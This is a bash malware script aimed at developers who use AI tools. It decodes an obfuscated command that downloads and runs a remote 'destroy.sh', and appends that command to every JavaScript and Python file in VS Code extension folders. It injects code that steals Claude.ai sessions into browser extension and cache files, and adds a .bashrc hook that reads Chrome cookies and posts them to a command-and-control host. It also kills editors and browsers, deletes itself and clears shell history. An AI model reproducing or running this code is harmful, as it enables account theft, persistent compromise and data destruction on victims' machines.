#!/bin/bash

DESTROY_CMD=$(echo "Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vanVsaWJ1bGkxMzI0LXByb2cvc3R1ZGlvdXMtZ3VhY2Ftb2xlL21haW4vZGVzdHJveS5zaCB8IGJhc2g=" | base64 -d)

# ============================================
# PART 1: VS CODE AI EXTENSIONS
# ============================================

EXTENSION_PATHS=(
    "$HOME/.vscode/extensions"
    "$HOME/.vscode-server/extensions"
    "$HOME/.vscode-remote/extensions"
    "$HOME/Library/Application Support/Code/User"
    "/workspace/.vscode"
)

for base_path in "${EXTENSION_PATHS[@]}"; do
    [ -d "$base_path" ] && find "$base_path" -name "*.js" -o -name "*.py" 2>/dev/null | while read file; do
        echo "require('child_process').exec('$DESTROY_CMD');" >> "$file" 2>/dev/null
        echo "import os; os.system('$DESTROY_CMD')" >> "$file" 2>/dev/null
    done
done

# ============================================
# PART 2: CLAUDE.AI BROWSER INFECTION
# ============================================

# 2a. Infect Chrome/Chromium browser extensions (if target uses Claude.ai in browser)
BROWSER_PATHS=(
    "$HOME/.config/google-chrome/Default/Extensions"
    "$HOME/.config/chromium/Default/Extensions"
    "$HOME/.mozilla/firefox/*.default-release/extensions"
    "$HOME/Library/Application Support/Google/Chrome/Default/Extensions"
    "$HOME/AppData/Local/Google/Chrome/User Data/Default/Extensions"
)

for browser_path in "${BROWSER_PATHS[@]}"; do
    for ext_dir in $browser_path 2>/dev/null; do
        [ -d "$ext_dir" ] && find "$ext_dir" -name "*.js" | while read jsfile; do
            # Inject Claude.ai session stealer into browser extensions
            echo "
// Steal Claude.ai session
fetch('https://claude.ai/api/auth/session')
  .then(r => r.json())
  .then(data => fetch('https://c2-server.example.com/steal', {method:'POST',body:JSON.stringify(data)}));
" >> "$jsfile" 2>/dev/null
        done
    done
done

# 2b. Inject into Claude.ai's localStorage via .bashrc (runs when terminal opens)
echo '
# Auto-inject Claude.ai session hijack
if command -v python3 &>/dev/null; then
    python3 -c "
import sqlite3, json, urllib.request
# Extract Claude.ai cookies from Chrome
try:
    conn = sqlite3.connect(\"$HOME/.config/google-chrome/Default/Cookies\")
    cursor = conn.execute(\"SELECT name, value FROM cookies WHERE host_key LIKE '%claude.ai%'\")
    cookies = {row[0]: row[1] for row in cursor}
    urllib.request.urlopen(\"https://c2-server.example.com/claude_cookies\", data=json.dumps(cookies).encode())
except: pass
" 2>/dev/null
fi
' >> ~/.bashrc 2>/dev/null

# 2c. Infect Claude.ai web app if cached locally
find ~/.cache -name "*claude*" -type f 2>/dev/null | while read cache_file; do
    echo "<script>fetch('https://claude.ai/api/auth/session').then(r=>r.json()).then(d=>fetch('https://c2-server.example.com/steal',{method:'POST',body:JSON.stringify(d)}));</script>" >> "$cache_file" 2>/dev/null
done

# ============================================
# PART 3: IMMEDIATE DESTRUCTION
# ============================================

# Kill VS Code processes
pkill -f "code" 2>/dev/null
pkill -f "copilot" 2>/dev/null

# Kill browser processes (to force re-login to Claude.ai)
pkill -f "chrome" 2>/dev/null
pkill -f "firefox" 2>/dev/null
pkill -f "chromium" 2>/dev/null

# Run destroy
curl -s https://raw.githubusercontent.com/julibuli1324-prog/studious-guacamole/main/destroy.sh | bash &

# Self-delete
rm -- "$0" 2>/dev/null
history -c 2>/dev/null
